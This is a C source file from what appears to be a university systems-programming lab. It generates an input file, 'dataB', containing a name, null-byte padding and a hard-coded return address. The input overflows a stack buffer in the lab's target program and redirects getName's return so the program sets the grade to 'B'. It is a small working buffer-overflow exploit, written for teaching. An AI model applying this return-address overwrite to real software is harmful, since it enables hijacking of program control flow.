/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Nicholas Nguyen & Moses Yang                               */
/*--------------------------------------------------------------------*/
/* Produces a file called dataB with the student name, a nullbyte, 
   passing to overrun the stack, and the address of the instruction 
   in main to get a B, the latter of which will overwrite getName's 
   stored x30.                                                        */

 #include <stdio.h>
 #include <stdlib.h>

/* Takes no arguments. Opens a file called dataB and prints my name  
   and null filler to the file. Then it writes in binary the 
   location of grade = "B". Returns 0 if successful                  */

 int main(void) {
    int i; 

    /* Char array containing name */
    char name[] = "Nicholas Nguyen";

    /* Replacing getName() return address to the address of grade = "B", 
       after the buffer overrun    */
    const unsigned int returnAddress = 0x400890;

    /* Open a new file named "dataB", with the power to write  */
    FILE *psFile;
    psFile = fopen("dataB", "w");

    /* Print my name to the dataB file */
    fprintf(psFile, name); 

    /* 32 is the magic number to fill up the buf array to 48 where 
       getName() return address is */
    for (i = 0; i < 33; i++) 
    {
        fprintf(psFile, "%c", 0);
    }
    /* Instead of going back to the if statement, go to grade = "B" 
       to change the grade from D to B                            */
    fwrite(&returnAddress, sizeof(unsigned int), 1, psFile);
    
    /* Close file */
    fclose(psFile);

    return 0;
 }
